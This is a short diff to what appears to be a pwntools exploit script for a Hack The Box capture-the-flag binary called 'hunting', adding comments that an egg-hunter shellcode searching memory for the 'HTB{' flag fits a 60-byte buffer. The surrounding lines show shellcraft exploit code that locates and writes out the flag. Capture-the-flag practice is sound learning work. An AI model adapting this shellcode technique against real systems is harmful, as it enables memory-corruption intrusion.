@@ -47,6 +47,7 @@ def main():
     r = conn()
 
     # Staged payloads + egg hunter
+    # (Actually the staged payloads is unnecessary since the egg hunter is small enough to fit the 60-byte buffer.)
 
     # seccomp-tools dump ./hunting => restricted syscalls, cannot bring up shell
 
@@ -68,6 +69,7 @@ def main():
     EGG = b'HTB{' # }
     egg_hunter_asm = shellcraft.egghunter(EGG, start_address=0x60000000)
     info(f'egg hunting code is {egg_hunter_asm}')
+    info(f'egg hunting code has length {len(asm(egg_hunter_asm))}')     # Actually this egg hunter can fit in the 60-byte buffer. We don't need staged payloads.
     # The 'ebx' the found egg address from the egg hunter above.
     write_asm = shellcraft.write(1, 'ebx', 100)
     info(f'write asm is {write_asm}')
